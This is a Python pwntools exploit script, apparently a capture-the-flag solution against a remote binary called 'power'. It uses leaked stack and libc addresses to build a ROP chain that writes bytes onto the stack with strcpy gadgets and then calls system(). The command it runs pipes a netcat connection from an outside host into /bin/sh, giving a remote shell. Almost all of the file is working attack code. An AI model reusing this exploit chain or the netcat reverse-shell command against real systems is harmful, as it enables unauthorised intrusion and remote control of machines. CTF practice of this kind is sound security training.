from pwn import *

def search(byte):
	x = list(e.search(byte))
	for y in x:
		if 0x8048470 < y < 0x8048927:
			return y

	raise Exception("byte %02x not found!\n"%ord(byte))

if __name__ == "__main__":
	e = ELF("./power")
	libc = ELF("./libc_32.so")

	p = remote("remote.goatskin.kr", 38883)
	p.recvuntil("argv: ")
	ARGV = int(p.recvline(),16)
	p.recvuntil("Stack: ")
	STACK = int(p.recvline(),16)
	p.recvuntil("Libc: ")
	LIBC = int(p.recvline(),16)
	p.recvuntil("Since you cannot communicate with binary, I think you should build open, read, write chain!\n")
	
	INTMAX = 2**32-1
	readlen = 0x80485DE
	strcpy = 0x80485A3
	pr = 0x08048401
	ppr = 0x080486ba
	pppr = 0x080486b9
	pop_ebp = 0x080486bb
	leave_ret = 0x080484d8
	retstack = ARGV - 0x80 #avoid usage of null

	# libc functions
	system = LIBC + libc.symbols['system']
	command_str = "nc ssh.goatskin.kr 33834 | /bin/sh | nc ssh.goatskin.kr 33833\x00"

	# idea: use strcpy to write custom data to stack

	loader = [INTMAX,INTMAX] # before return address
	cmd_addr = retstack + 0x4*3
	ROP = p32(system)+p32(0)+p32(cmd_addr)+command_str

	for i in range(len(ROP)):
		loader += [strcpy,ppr,retstack+i,search(ROP[i])]
	loader += [pop_ebp, retstack-4, leave_ret]
	    
	for x in loader:
		p.sendline(hex(x))
	
	p.sendline("")

	p.interactive()
